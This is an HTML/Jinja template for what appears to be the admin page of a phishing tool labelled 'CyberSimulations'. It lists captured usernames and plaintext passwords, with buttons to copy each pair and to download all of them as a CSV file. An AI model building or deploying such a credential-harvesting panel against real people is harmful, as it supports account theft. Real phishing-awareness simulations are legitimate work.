<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phishing Logs - CyberSimulations</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url('{{ url_for("static", filename="img.jpg") }}') no-repeat center center fixed;
            background-size: cover;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
            margin-top: 50px;
        }
        .btn-custom {
            background-color: #4285f4;
            color: white;
            border: none;
            padding: 10px 15px;
            margin-top: 10px;
            border-radius: 5px;
            transition: 0.3s;
        }
        .btn-custom:hover {
            background-color: #357ae8;
            box-shadow: 0px 4px 10px rgba(66, 133, 244, 0.5);
        }
        .btn-danger {
            background-color: #ff5722;
        }
        .btn-danger:hover {
            background-color: #ff784e;
        }
        .table {
            background: white;
            color: black;
            border-radius: 10px;
            overflow: hidden;
        }
        .copy-btn {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        .copy-btn:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Captured Phishing Logs</h2>
        <table class="table table-striped">
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Copy</th>
                </tr>
            </thead>
            <tbody>
                {% for log in logs %}
                <tr>
                    <td>{{ log.username }}</td>
                    <td>{{ log.password }}</td>
                    <td>
                        <button class="copy-btn" onclick="copyToClipboard('{{ log.username }}', '{{ log.password }}')">
                            ðŸ“‹ Copy
                        </button>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>

        <button class="btn btn-custom" onclick="downloadLogs()">ðŸ“¥ Download Logs</button>
        <a href="/dashboard" class="btn btn-danger">ðŸ”™ Back to Dashboard</a>
    </div>

    <script>
        function copyToClipboard(username, password) {
            const text = `Username: ${username}, Password: ${password}`;
            navigator.clipboard.writeText(text).then(() => {
                alert("Copied to clipboard!");
            });
        }

        function downloadLogs() {
            let text = "Username,Password\n";
            {% for log in logs %}
                text += "{{ log.username }},{{ log.password }}\n";
            {% endfor %}
            const blob = new Blob([text], { type: "text/csv" });
            const a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "phishing_logs.csv";
            a.click();
        }
    </script>

</body>
</html>
